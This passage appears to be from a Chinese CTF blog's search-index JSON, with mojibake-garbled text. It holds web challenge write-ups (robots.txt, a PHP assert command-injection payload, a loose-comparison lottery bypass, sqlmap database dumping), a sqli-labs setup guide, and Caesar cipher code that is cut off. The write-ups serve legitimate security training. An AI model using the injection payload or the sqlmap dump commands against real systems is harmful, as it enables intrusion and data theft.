¹ç›®å½•ä¸‹æ˜¯å¦å­˜åœ¨robots.txtï¼Œå¦‚æœå­˜åœ¨ï¼Œæœç´¢æœºå™¨äººå°±ä¼šæŒ‰ç…§è¯¥æ–‡ä»¶ä¸­çš„å†…å®¹æ¥ç¡®å®šè®¿é—®çš„èŒƒå›´ï¼›å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œæ‰€æœ‰çš„æœç´¢èœ˜è››å°†èƒ½å¤Ÿè®¿é—®ç½‘ç«™ä¸Šæ‰€æœ‰æ²¡æœ‰è¢«å£ä»¤ä¿æŠ¤çš„é¡µé¢ã€‚ç™¾åº¦å®˜æ–¹å»ºè®®ï¼Œä»…å½“æ‚¨çš„ç½‘ç«™åŒ…å«ä¸å¸Œæœ›è¢«æœç´¢å¼•æ“æ”¶å½•çš„å†…å®¹æ—¶ï¼Œæ‰éœ€è¦ä½¿ç”¨robots.txtæ–‡ä»¶ã€‚å¦‚æœæ‚¨å¸Œæœ›æœç´¢å¼•æ“æ”¶å½•ç½‘ç«™ä¸Šæ‰€æœ‰å†…å®¹ï¼Œè¯·å‹¿å»ºç«‹robots.txtæ–‡ä»¶ã€‚ å¦‚æœå°†ç½‘ç«™è§†ä¸ºé…’åº—é‡Œçš„ä¸€ä¸ªæˆ¿é—´ï¼Œrobots.txtå°±æ˜¯ä¸»äººåœ¨æˆ¿é—´é—¨å£æ‚¬æŒ‚çš„â€œè¯·å‹¿æ‰“æ‰°â€æˆ–â€œæ¬¢è¿æ‰“æ‰«â€çš„æç¤ºç‰Œã€‚è¿™ä¸ªæ–‡ä»¶å‘Šè¯‰æ¥è®¿çš„æœç´¢å¼•æ“å“ªäº›æˆ¿é—´å¯ä»¥è¿›å…¥å’Œå‚è§‚ï¼Œå“ªäº›æˆ¿é—´å› ä¸ºå­˜æ”¾è´µé‡ç‰©å“ï¼Œæˆ–å¯èƒ½æ¶‰åŠä½æˆ·åŠè®¿å®¢çš„éšç§è€Œä¸å¯¹æœç´¢å¼•æ“å¼€æ”¾ã€‚ä½†robots.txtä¸æ˜¯å‘½ä»¤ï¼Œä¹Ÿä¸æ˜¯é˜²ç«å¢™ï¼Œå¦‚åŒå®ˆé—¨äººæ— æ³•é˜»æ­¢çªƒè´¼ç­‰æ¶æ„é—¯å…¥è€…ã€‚ Robotsåè®®ç”¨æ¥å‘ŠçŸ¥æœç´¢å¼•æ“å“ªäº›é¡µé¢èƒ½è¢«æŠ“å–ï¼Œå“ªäº›é¡µé¢ä¸èƒ½è¢«æŠ“å–ï¼›å¯ä»¥å±è”½ä¸€äº›ç½‘ç«™ä¸­æ¯”è¾ƒå¤§çš„æ–‡ä»¶ï¼Œå¦‚ï¼šå›¾ç‰‡ï¼ŒéŸ³ä¹ï¼Œè§†é¢‘ç­‰ï¼ŒèŠ‚çœæœåŠ¡å™¨å¸¦å®½ï¼›å¯ä»¥å±è”½ç«™ç‚¹çš„ä¸€äº›æ­»é“¾æ¥ã€‚æ–¹ä¾¿æœç´¢å¼•æ“æŠ“å–ç½‘ç«™å†…å®¹ï¼›è®¾ç½®ç½‘ç«™åœ°å›¾è¿æ¥ï¼Œæ–¹ä¾¿å¼•å¯¼èœ˜è››çˆ¬å–é¡µé¢ã€‚(æ‘˜è‡ªç™¾åº¦ç™¾ç§‘) å®é™…æ“ä½œï¼š è®¿é—®robots.txtï¼Œå‘ç°ä¸å…è®¸è®¿é—®fl0g.php å°è¯•è®¿é—®/fl0g.phpï¼Œå¾—åˆ°flagï¼›","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"æ”»é˜²ä¸–ç•Œ","slug":"CTF/æ”»é˜²ä¸–ç•Œ","permalink":"https://singlemindedt.github.io/categories/CTF/æ”»é˜²ä¸–ç•Œ/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"Mfw","slug":"Mfw","date":"2019-12-09T00:58:05.000Z","updated":"2019-12-30T05:47:02.290Z","comments":true,"path":"2019/12/09/Mfw/","link":"","permalink":"https://singlemindedt.github.io/2019/12/09/Mfw/","excerpt":"","text":"Mfwé¢˜ç›®åˆ†æï¼šæ‰“å¼€é“¾æ¥ï¼Œå‡ ä¸ªç›®å½•éƒ½çœ‹äº†ä¸‹ï¼Œå‘ç°ï¼š å¯èƒ½å­˜åœ¨gitæºç æ³„éœ²ï¼Œå°è¯•è®¿é—®.gitç›®å½•ï¼š å®é™…æ“ä½œï¼šåˆ©ç”¨Githackå¾—åˆ°ç½‘ç«™æºç (ç›´æ¥å°†GitHack.pyæ‹–å…¥cmd,è¾“å…¥æ‰§è¡Œå‘½ä»¤)ï¼š åœ¨GitHackç›®å½•ä¸‹å¯ä»¥çœ‹åˆ°ç½‘ç«™æºç æ–‡ä»¶å¤¹ï¼š åœ¨flag.phpä¸­åªæœ‰å¦‚ä¸‹å†…å®¹ï¼š 1234&lt;?php// TODO// $FLAG = '';?&gt; æ˜¯å°†flag.phpä¸­çš„å†…å®¹æ³¨é‡Šäº†ï¼Œä¸æ˜¾åœ¨ç½‘é¡µä¸Šã€‚ åœ¨index.phpä¸­å‘ç°å…³é”®ä»£ç ï¼š 12345678910111213&lt;?phpif (isset($_GET['page'])) &#123; $page = $_GET['page'];&#125; else &#123; $page = \"home\";&#125;$file = \"templates/\" . $page . \".php\";// I heard '..' is dangerous!assert(\"strpos('$file', '..') === false\") or die(\"Detected hacking attempt!\");// TODO: Make this look niceassert(\"file_exists('$file')\") or die(\"That file doesn't exist!\");?&gt; **assert()è¿™ä¸ªå‡½æ•°åœ¨phpè¯­è¨€ä¸­æ˜¯ç”¨æ¥åˆ¤æ–­ä¸€ä¸ªè¡¨è¾¾å¼æ˜¯å¦æˆç«‹ã€‚è¿”å›true or false; 1234567891011/*PHPå®˜æ–¹æ–‡æ¡£æ˜¯æ€ä¹ˆè§£é‡Šçš„ï¼šassert â€” æ£€æŸ¥ä¸€ä¸ªæ–­è¨€æ˜¯å¦ä¸º FALSE PHP 5 bool assert ( mixed $assertion [, string $description ] ) PHP 7 bool assert ( mixed $assertion [, Throwable $exception ] ) assert() ä¼šæ£€æŸ¥æŒ‡å®šçš„ assertion å¹¶åœ¨ç»“æœä¸º FALSE æ—¶é‡‡å–é€‚å½“çš„è¡ŒåŠ¨ã€‚ å¦‚æœ assertion æ˜¯å­—ç¬¦ä¸²ï¼Œå®ƒå°†ä¼šè¢« assert() å½“åš PHP ä»£ç æ¥æ‰§è¡Œã€‚ assertion æ˜¯å­—ç¬¦ä¸²çš„ä¼˜åŠ¿æ˜¯å½“ç¦ç”¨æ–­è¨€æ—¶å®ƒçš„å¼€é”€ä¼šæ›´å°ï¼Œå¹¶ä¸”åœ¨æ–­è¨€å¤±è´¥æ—¶æ¶ˆæ¯ä¼šåŒ…å« assertion è¡¨è¾¾å¼ã€‚ è¿™æ„å‘³ç€å¦‚æœä½ ä¼ å…¥äº† boolean çš„æ¡ä»¶ä½œä¸º assertionï¼Œè¿™ä¸ªæ¡ä»¶å°†ä¸ä¼šæ˜¾ç¤ºä¸ºæ–­è¨€å‡½æ•°çš„å‚æ•°ï¼›åœ¨è°ƒç”¨ä½ å®šä¹‰çš„ assert_options() å¤„ç†å‡½æ•°æ—¶ï¼Œæ¡ä»¶ä¼šè½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œè€Œå¸ƒå°”å€¼ FALSE ä¼šè¢«è½¬æ¢æˆç©ºå­—ç¬¦ä¸²ã€‚æ–­è¨€è¿™ä¸ªåŠŸèƒ½åº”è¯¥åªè¢«ç”¨æ¥è°ƒè¯•ã€‚ ä½ åº”è¯¥ç”¨äºå®Œæ•´æ€§æ£€æŸ¥æ—¶æµ‹è¯•æ¡ä»¶æ˜¯å¦å§‹ç»ˆåº”è¯¥ä¸º TRUEï¼Œæ¥æŒ‡ç¤ºæŸäº›ç¨‹åºé”™è¯¯ï¼Œæˆ–è€…æ£€æŸ¥å…·ä½“åŠŸèƒ½çš„å­˜åœ¨ï¼ˆç±»ä¼¼æ‰©å±•å‡½æ•°æˆ–ç‰¹å®šçš„ç³»ç»Ÿé™åˆ¶å’ŒåŠŸèƒ½ï¼‰ã€‚*/ 123die() å‡½æ•°è¾“å‡ºä¸€æ¡æ¶ˆæ¯ï¼Œå¹¶é€€å‡ºå½“å‰è„šæœ¬ï¼›strpos(string,find,start)æŸ¥æ‰¾findåœ¨å­—ç¬¦ä¸²stringä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®;file_exists() å‡½æ•°æ£€æŸ¥æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦å­˜åœ¨ã€‚å¦‚æœæŒ‡å®šçš„æ–‡ä»¶æˆ–ç›®å½•å­˜åœ¨åˆ™è¿”å› TRUEï¼Œå¦åˆ™è¿”å› FALSEã€‚ **å¦‚æ­¤è¿™èˆ¬ï¼Œå¯ä»¥åˆ©ç”¨assert()å‡½æ•°æ‰§è¡Œå‘½ä»¤ï¼Œç±»ä¼¼sqlæ³¨å…¥ï¼Œåœ¨æ•°æ®åº“ä¸­æŸ¥æ‰¾ï¼Œæ„é€ urlä¸ºpage=abcâ€™) or system(â€œcat templates/flag.phpâ€);//{ç”¨lwwâ€™)é—­åˆå‰åŠéƒ¨åˆ†ï¼Œå¾—åˆ°falseï¼›ä¹‹åæ‰§è¡Œsystem();//æ³¨é‡Šæ‰åé¢çš„ä»£ç ï¼›","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"æ”»é˜²ä¸–ç•Œ","slug":"CTF/æ”»é˜²ä¸–ç•Œ","permalink":"https://singlemindedt.github.io/categories/CTF/æ”»é˜²ä¸–ç•Œ/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"Lottery!","slug":"Lottery","date":"2019-12-09T00:49:07.000Z","updated":"2019-12-30T05:27:05.568Z","comments":true,"path":"2019/12/09/Lottery/","link":"","permalink":"https://singlemindedt.github.io/2019/12/09/Lottery/","excerpt":"","text":"Lotteryï¼é¢˜ç›®åˆ†æï¼šéšä¾¿è¾“å…¥7ä¸ªæ•°å­—å¾—åˆ°ä»¥ä¸‹ç»“æœï¼Œå¹¶ä¸”æ¯æ¬¡çš„winning numberséƒ½æ˜¯ä¸åŒçš„ï¼Œåº”è¯¥ä¸ºéšæœºæ•°ï¼›æ ¹æ®Claim Your Prizeä¸­çš„æç¤ºï¼Œéœ€è¦èŠ±è´¹$9990000æ‰èƒ½ä¹°åˆ°flagï¼Œå¦‚æœä¸€ç›´çŒœæ•°å­—è·å¾—ä½™é¢ä¸å¤ªç°å®ï¼Œ å®é™…æ“ä½œ:ç”¨burpsuiteå¯¹è¾“å…¥å½©ç¥¨æ•°å­—éªŒè¯è¿‡ç¨‹æŠ“åŒ…ï¼Œå¾—åˆ°api.php; ä¸è¿‡è¿˜æ˜¯ä¸å¤ªæ¸…æ¥šæ€ä¹ˆæï¼Œçœ‹äº†ä¸‹wpï¼Œè¯´æ˜¯gitæºç æ³„éœ²ï¼šåœ¨è¿è¡Œgit initåˆå§‹åŒ–ä»£ç åº“çš„æ—¶å€™ï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹é¢äº§ç”Ÿä¸€ä¸ª.gitçš„éšè—æ–‡ä»¶ï¼Œç”¨æ¥è®°å½•ä»£ç çš„å˜æ›´è®°å½•ç­‰ç­‰ã€‚åœ¨å‘å¸ƒä»£ç çš„æ—¶å€™ï¼ŒæŠŠ.gitè¿™ä¸ªç›®å½•æ²¡æœ‰åˆ é™¤ï¼Œç›´æ¥å‘å¸ƒäº†ã€‚ä½¿ç”¨è¿™ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥ç”¨æ¥æ¢å¤æºä»£ç ã€‚ å°è¯•è®¿é—®ï¼š å¯ä»¥åˆ©ç”¨Githackæå–ä¸‹è½½æºç ï¼›(ä½†å…¶å®æœ¬é¢˜ç›´æ¥åœ¨é™„ä»¶é‡Œç»™å‡ºäº†ç½‘ç«™æºç ã€æ»‘ç¨½.gif)æ‰“å¼€ä¹‹å‰ä¸‹è½½å¥½çš„æºæ–‡ä»¶ï¼š æ‰“å¼€api.phpæ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°ä»¥ä¸‹éªŒè¯å½©ç¥¨æ•°å­—ä»£ç ï¼š 123456789101112131415161718192021222324252627282930$win_numbers = random_win_nums(); $same_count = 0; for($i=0; $i&lt;7; $i++)&#123; if($numbers[$i] == $win_numbers[$i])&#123; $same_count++; &#125; &#125; switch ($same_count) &#123; case 2: $prize = 5; break; case 3: $prize = 20; break; case 4: $prize = 300; break; case 5: $prize = 1800; break; case 6: $prize = 200000; break; case 7: $prize = 5000000; break; default: $prize = 0; break; &#125; å¯ä»¥çœ‹åˆ°ï¼Œä»£ç å°†ç”¨æˆ·è¾“å…¥çš„7ä¸ªæ•°ä¸7ä¸ªéšæœºæ•°æ¯”è¾ƒï¼Œå¹¶ä¸”ç”¨çš„==(å¼±ç±»å‹æ¯”è¾ƒ),å› ä¸ºjsonæ”¯æŒboolæ•°æ®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨trueæ¥ä½¿==æˆç«‹ï¼›æ”¹åŒ…ï¼š å‘ç°å·²ç»è·å¾—$200000;å¤šæäº¤å‡ ä½™é¢å°±å¤Ÿäº†ï¼Œbuy-&gt;flagï¼›","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"æ”»é˜²ä¸–ç•Œ","slug":"CTF/æ”»é˜²ä¸–ç•Œ","permalink":"https://singlemindedt.github.io/categories/CTF/æ”»é˜²ä¸–ç•Œ/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"ics-04","slug":"ics-04","date":"2019-12-09T00:28:33.000Z","updated":"2019-12-30T05:16:00.470Z","comments":true,"path":"2019/12/09/ics-04/","link":"","permalink":"https://singlemindedt.github.io/2019/12/09/ics-04/","excerpt":"","text":"ics-04é—®é¢˜åˆ†æï¼š æœ¬é¢˜å’Œä¹‹å‰å‡ é¢˜ä½¿ç”¨äº†ç›¸åŒçš„é¡µé¢ï¼Œæ ¹æ®æç¤ºæ¼æ´ä½ç½®åº”è¯¥åœ¨ç™»å½•å’Œæ³¨å†Œä¸Šï¼Œéšä¾¿æ³¨å†Œéƒ½èƒ½æˆåŠŸï¼Œä½†æ˜¯ç™»å½•æ—¶æç¤ºâ€œæ™®é€šç”¨æˆ·ç™»å½•æˆåŠŸï¼Œæ²¡ä»€ä¹ˆç”¨â€ï¼› å°è¯•sqlæ³¨å…¥ï¼Œè¿™ä¸¤ä¸ªåœ°æ–¹å¹¶æ²¡æœ‰ä»€ä¹ˆæ³¨å…¥ç‚¹ï¼Œçœ‹åˆ°è¿˜æœ‰ä¸ªâ€œå¿˜è®°å¯†ç ï¼Ÿâ€ï¼Œå¯ä»¥æ­£å¸¸ä½¿ç”¨æ‰¾å›å¯†ç ï¼Œå°è¯•sqlæ³¨å…¥ï¼›åˆ©ç”¨sqlmapæ£€æµ‹ï¼Œå‘ç°å­˜åœ¨æ¼æ´ï¼› æ„é€ å‘½ä»¤çŒœè§£æ•°æ®åº“åï¼šâ€“dbs æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ•°æ®åº“1sqlmap -u \"http://111.198.29.45:33931/findpwd.php\" --data=\"username=1\" --dbs å¾—åˆ°åº“åç»“æœï¼› åº“å å¯¹æ¯ä¸ªæ•°æ®åº“è¿›è¡Œè¡¨åçŒœè§£ï¼›1sqlmap -u \"http://111.198.29.45:33931/findpwd.php\" --data=\"username=1\" -D cetc004 --tables å¯¹æ•°æ®åº“cetc004ä¸­è¡¨userçŒœè§£åˆ—åï¼›â€“columns æšä¸¾DBMSæ•°æ®åº“è¡¨åˆ—1sqlmap -u \"http://111.198.29.45:33931/findpwd.php\" --data=\"username=1\" -D cetc004 -T user --columns å¯¹usernameå’Œpasswordè¿›è¡Œå†…å®¹æŸ¥è¯¢ï¼›â€“dump è½¬å‚¨æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„æ•°æ®åº“ä¸­çš„è¡¨é¡¹ 1sqlmap -u \"http://111.198.29.45:33931/findpwd.php\" --data=\"username=1\" -D cetc004 -T user -C \"username,password\" --dump ç”±äºå¯ä»¥é‡å¤æ³¨å†Œï¼Œäºæ˜¯ä½¿ç”¨c3tlwDmln23æ³¨å†Œï¼Œæ³¨å†ŒæˆåŠŸï¼Œç™»é™†åå¾—åˆ°flagï¼› æ­¤æ—¶å¯¹usernameæŸ¥è¯¢å¯å¾—åˆ°ä¸¤æ¡ç»“æœï¼›ç¬¬ä¸€è¡Œä¸ºåŸæ¥çš„ï¼Œç¬¬äºŒè¡Œä¸ºåˆšæ‰æ³¨å†Œçš„ï¼Œæ‰€ä»¥æ¼æ´åŸå› ä¸ºæœªå¯¹ç”¨æˆ·åé‡å¤é—®é¢˜åŠ ä»¥è¿‡æ»¤ï¼Œé€ æˆæ•°æ®åº“æŸ¥è¡¨é”™è¯¯ï¼›çŸ¥è¯†è¡¥å……ï¼šå¦‚æœè§‰å¾—æ‰“å¼€Kaliè™šæ‹Ÿæœºéº»çƒ¦ï¼Œå¯ä»¥åœ¨Windowsä¸Šå®‰è£…ä¸€ä¸ªsqlmapï¼Œå…·ä½“æ­¥éª¤ç½‘ä¸Šéƒ½æœ‰æ•™ç¨‹ï¼›å¦‚æœé‡åˆ°â€œä¸æ˜¯å†…éƒ¨æˆ–å¤–éƒ¨å‘½ä»¤ï¼Œä¹Ÿä¸æ˜¯å¯è¿è¡Œçš„ç¨‹åº æˆ–æ‰¹å¤„ç†æ–‡ä»¶ã€‚â€æ—¶ï¼Œçœ‹ä¸€ä¸‹è‡ªå·±çš„â€œèµ·å§‹ä½ç½®â€çš„è·¯å¾„ï¼Œæ˜¯ä¸æ˜¯æ²¡æœ‰æŒ‡å®šæ¸…æ¥šï¼Œå¦‚æœå¡«å†™çš„æ˜¯C:\\Python27\\sqlmapï¼›é‚£ä¹ˆè¯·æŸ¥çœ‹sqlmapä¸‹åˆ°sqlmap python Fileæ˜¯å¦è¿˜æœ‰é—´æ¥æ–‡ä»¶å¤¹ï¼Œè‹¥æœ‰ç›´æ¥åŠ ä¸Š\\nameï¼›æˆ–è€…ç›´æ¥å¤åˆ¶æ”¹åä¸ºsqlmapæ”¾åœ¨Python27ä¸‹ï¼›åˆ é™¤åŸæ¥çš„æ–‡ä»¶ï¼›å…³äºsqlmapä½¿ç”¨ï¼šhttps://blog.csdn.net/qq_33530840/article/details/82144515","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"æ”»é˜²ä¸–ç•Œ","slug":"CTF/æ”»é˜²ä¸–ç•Œ","permalink":"https://singlemindedt.github.io/categories/CTF/æ”»é˜²ä¸–ç•Œ/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"sqli-labsç¯å¢ƒæ­å»º","slug":"sqli-labsç¯å¢ƒæ­å»º","date":"2019-12-02T02:01:08.000Z","updated":"2020-02-19T08:43:53.530Z","comments":true,"path":"2019/12/02/sqli-labsç¯å¢ƒæ­å»º/","link":"","permalink":"https://singlemindedt.github.io/2019/12/02/sqli-labsç¯å¢ƒæ­å»º/","excerpt":"","text":"1.ç”±äºç‰ˆæœ¬æ”¯æŒç­‰é—®é¢˜ï¼Œæ­¤æ¬¡ç¯å¢ƒå®‰è£…å»ºè®®ä¸‹è½½Phpstudy2018ç‰ˆæœ¬ï¼Œè§£å‹å®‰è£…(å¯è‡ªå®šä¹‰å®‰è£…ç›®å½•)ï¼› 2.ä¸‹è½½sqli-labsæ–‡ä»¶ï¼ŒGithubä¸‹è½½è§£å‹è‡³Phpstudy2018\\PHPTutorial\\WWWç›®å½•ä¸‹ï¼› 3.æ›´æ”¹æ•°æ®åº“å¯†ç ï¼ŒE:\\PhpStudy2018\\PHPTutorial\\WWW\\sqli-labs-master\\sqli-labs-master\\sql-connections\\db-creds,è‡ªå·±ä»»æ„è®¾ç½®ï¼› 4.å¼€å¯Phpstudy2018çš„Apacheå’ŒMySqlæœåŠ¡; 5.åŸºæœ¬é…ç½®å®Œæˆï¼Œæ‰“å¼€ http://127.0.0.1/sqli-labs-master/ è‹¥å‡ºç°å¦‚ä¸‹é¡µé¢åˆ™æ­å»ºæˆåŠŸï¼› 6.ç‚¹å‡»Setup/reset Database for labså»ºç«‹æ•°æ®åº“è¿æ¥ï¼Œè‹¥å‡ºç°å¦‚ä¸‹é¡µé¢åˆ™æ­å»ºå®Œæˆï¼› 7.è®¿é—®http://127.0.0.1/sqli-labs-master/ æ—¶ï¼Œè‹¥å‡ºç°You donâ€™t have permission to access /sqli-labs-master/ on this server.ï¼›åˆ™æ‰“å¼€Phpstudy2018çš„â€œå…¶ä»–é€‰é¡¹èœå•\\æ‰“å¼€é…ç½®æ–‡ä»¶\\httpd.confâ€;é…ç½®ä¸ºå¦‚ä¸‹æƒ…å†µï¼› åŒæ—¶å°†â€œphpstudyè®¾ç½®â€è®¾ç½®ä¸ºâ€œå…è®¸ç›®å½•åˆ—è¡¨â€ï¼›è‡³æ­¤ï¼Œsqli-labsç¯å¢ƒæ­å»ºå®Œæˆï¼","categories":[{"name":"SQL","slug":"SQL","permalink":"https://singlemindedt.github.io/categories/SQL/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://singlemindedt.github.io/tags/SQL/"}]},{"title":"C++/Pythonå®ç°å‡¯æ’’å¯†ç ","slug":"å‡¯æ’’å¯†ç ","date":"2019-11-16T14:18:05.000Z","updated":"2019-12-17T13:18:28.419Z","comments":true,"path":"2019/11/16/å‡¯æ’’å¯†ç /","link":"","permalink":"https://singlemindedt.github.io/2019/11/16/å‡¯æ’’å¯†ç /","excerpt":"","text":"å‡¯æ’’å¯†ç C++ åœ¨å¯†ç å­¦ä¸­ï¼Œæºæ’’å¯†ç ï¼ˆè‹±è¯­ï¼šCaesar cipherï¼‰ï¼Œæˆ–ç§°æºæ’’åŠ å¯†ã€æºæ’’å˜æ¢ã€å˜æ¢åŠ å¯†ï¼Œæ˜¯ä¸€ç§æœ€ç®€å•ä¸”æœ€å¹¿ä¸ºäººçŸ¥çš„åŠ å¯†æŠ€æœ¯ã€‚å®ƒæ˜¯ä¸€ç§æ›¿æ¢åŠ å¯†çš„æŠ€æœ¯ï¼Œæ˜æ–‡ä¸­çš„æ‰€æœ‰å­—æ¯éƒ½åœ¨å­—æ¯è¡¨ä¸Šå‘åï¼ˆæˆ–å‘å‰ï¼‰æŒ‰ç…§ä¸€ä¸ªå›ºå®šæ•°ç›®è¿›è¡Œåç§»åè¢«æ›¿æ¢æˆå¯†æ–‡ã€‚ä¾‹å¦‚ï¼Œå½“åç§»é‡æ˜¯3çš„æ—¶å€™ï¼Œæ‰€æœ‰çš„å­—æ¯Aå°†è¢«æ›¿æ¢æˆDï¼ŒBå˜æˆEï¼Œä»¥æ­¤ç±»æ¨ã€‚è¿™ä¸ªåŠ å¯†æ–¹æ³•æ˜¯ä»¥ç½—é©¬å…±å’Œæ—¶æœŸæºæ’’çš„åå­—å‘½åçš„ï¼Œå½“å¹´æºæ’’æ›¾ç”¨æ­¤æ–¹æ³•ä¸å…¶å°†å†›ä»¬è¿›è¡Œè”ç³»ã€‚ ä»£ç å®ç° (å·²çŸ¥å¯†é’¥æƒ…å†µä¸‹) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include&lt;bits/stdc++.h&gt;using namespace std;void Encryption(string C,int key,int model);//åŠ å¯†å‡½æ•°void Decryption(string M,int key,int model);//è§£å¯†å‡½æ•°int main()&#123; string C; int key; int model; //int len;//å­—ç¬¦ä¸²é•¿åº¦ while(1) &#123; cout&lt;&lt;\"Model:\"&lt;&lt;endl; cout&lt;&lt;\"1:Encry\"&lt;&lt;endl; cout&lt;&lt;\"2:Decry\"&lt;&lt;endl; cin&gt;&gt;model; if(model==1) &#123; cout&lt;&lt;\"Please enter the content to be encrypted:\"; cin&gt;&gt;C; //len=strlen(C);//é”™è¯¯:Céœ€è¦è½¬æ¢ä¸ºchar*ç±»å‹ cout&lt;&lt;\"Please enter key :\"; cin&gt;&gt;key; Encryption(C,key,model); &#125; else if(model==2) &#123; cout&lt;&lt;\"Please enter the content to be decrypted:\"; cin&gt;&gt;C; cout&lt;&lt;\"Please enter key :\"; cin&gt;&gt;key; Decryption(C,key,model); &#125; else cout&lt;&lt;\"Error!\"&lt;&lt;endl; &#125; return 0;&#125; void Encryption(string C,int key,int model)&#123; if(model==1) &#123; for(int i=0;i&lt;C.length();i++) &#123; if(C[i]&gt;='A'&amp;&amp;C[i]&lt;='Z') C[i]='A'+(C[i]-'A'+key)%26; else if(C[i]&gt;='a'&amp;&amp;C[i]&lt;='z') C[i]='a'+(C[i]-'a'+key)%26; &#125; cout&lt;&lt;\"The result of the encryption isï¼š\"&lt;&lt;C&lt;&lt;endl; &#125; else cout&lt;&lt;\"Errorï¼\"&lt;&lt;endl; &#125; void Decryption(string M,int key,int model)&#123; if(model==2) &#123; for(int i = 0; i &lt;M.length(); i++) &#123; if(M[i] &gt;= 'A' &amp;&amp; M[i] &lt;= 'Z') M[i] = 'A'+(M[i]-'A'-key+26)%26;//M[i]='A'+(M[i]-'A'+(26-key)) else if(M[i] &gt;= 'a' &amp;&amp; M[i] &lt;= 'z') M[i] = 'a'+(M[i]-'a'-key+26)%26;//... &#125; cout&lt;&lt;\"The result of the decryption is:\"&lt;&lt;M&lt;&lt;endl; &#125; else cout&lt;&lt;\"Errorï¼\"&lt;&lt;endl; &#125; å®Œæ•´ç‰ˆï¼ˆå°±æ˜¯ç©·ä¸¾äº†keyï¼‰ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#include&lt;bits/stdc++.h&gt;using namespace std;void Encryption(string C,int key,int mode);//åŠ å¯†å‡½æ•°void Decryption(string M,int key,int mode);//è§£å¯†å‡½æ•°int main()&#123; string C; int key;//åç§»ä½ int mode; //int len;//å­—ç¬¦ä¸²é•¿åº¦ while(1) &#123; cout&lt;&lt;\"Mode:(Please enter selection modeï¼ï¼ï¼)\"&lt;&lt;endl; cout&lt;&lt;\"1:Encry\"&lt;&lt;endl; cout&lt;&lt;\"2:Decry\"&lt;&lt;endl; cout&lt;&lt;\"3:Keyless Decryption\"&lt;&lt;endl; cin&gt;&gt;mode; if(mode==1) &#123; cout&lt;&lt;\"Please enter the content to be encrypted:\"; cin&gt;&gt;C; //len=strlen(C);//é”™è¯¯:Céœ€è¦è½¬æ¢ä¸ºchar*ç±»å‹ cout&lt;&lt;\"Please enter key :\"; cin&gt;&gt;key; Encryption(C,key,mode); &#125; else if(mode==2) &#123; cout&lt;&lt;\"Please enter the content to be decrypted:\"; cin&gt;&gt;C; cout&lt;&lt;\"Please enter key :\"; cin&gt;&gt;key; Decryption(C,key,mode); &#125; else if(mode==3) &#123; cout&lt;&lt;\"Please enter the content to be decrypted:\"; cin&gt;&gt;C; for(int k=1;k&lt;26;k++) Decryption(C,k,mode); &#125; else cout&lt;&lt;\"Error!\"&lt;&lt;endl; &#125; return 0;&#125; void Encryption(string C,int key,int mode)&#123; //if(mode==1) //&#123; for(int i=0;i&lt;C.length();i++) &#123; if(C[i]&gt;='A'&amp;&amp;C[i]&lt;='Z') C[i]='A'+(C[i]-'A'+key)%26; else if(C[i]&gt;='a'&amp;&amp;C[i]&lt;='z') C[i]='a'+(C[i]-'a'+key)%26; &#125; cout&lt;&lt;\"The result of the encryption isï¼š\"&lt;&lt;C&lt;&lt;endl; //&#125; //else //cout&lt;&lt;\"Errorï¼\"&lt;&lt;endl; &#125; void Decryption(string M,int key,int mode)&#123; //if(mode==2) //&#123; for(int i = 0; i &lt;M.length(); i++) &#123; if(M[i] &gt;= 'A' &amp;&amp; M[i] &lt;= 'Z') M[i] = 'A'+(M[i]-'A'-key+26)%26;//M[i]='A'+(M[i]-'A'+(26-key)) else if(M[i] &gt;= 'a' &amp;&amp; M[i] &lt;= 'z') M[i] = 'a'+(M[i]-'a'-key+26)%26;//... &#125; cout&lt;&lt;\"The result of the decryption is:\"&lt;&lt;M&lt;&lt;endl; cout&lt;&lt;endl; //&#125; // else // cout&lt;&lt;\"Errorï¼\"&lt;&lt;endl; &#125; #å‡¯æ’’å¯†ç Python 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#Encryptiondef Encryption(C,key,mode): C_list=list(C) C_list_encry=C_list i=0 while i&lt;len(C_list ): if(ord(C_list[i])&gt;=65 and ord(C_list[i])&lt;=90): C_list_encry[i]=chr(65+(ord(C_list[i])-65+key)%26) if (ord(C_list[i])&gt;=97 and ord(C_list[i]) &lt;= 122): C_list_encry[i] = chr(97+ (ord(C_list[i]) - 97 + key) % 26) i+=1 print(\"The result of the encryption isï¼š\"+\"\".join(C_list_encry ))#Decryptiondef Decryption(C,key,mode): C_list = list(C) C_list_decry = C_list i = 0 while i &lt; len(C_list): if (ord(C_list[i]) &gt;= 65 and ord(C_list[i]) &lt;= 90): C_list_decry[i] = chr(65 + (ord(C_list[i])-65-key+26) % 26) if (ord(C_list[i]) &gt;= 97 and ord(C_list[i]) &lt;= 122): C_list_decry[i] = chr(97 + (ord(C_list[i]) - 97-key+26) % 26) i+=1 print(\"The result of the decryption is:\"+\"\".join(C_list_decry))#main()def main(): while(1): print(\"Mode:(Please select modeï¼ï¼ï¼)\") 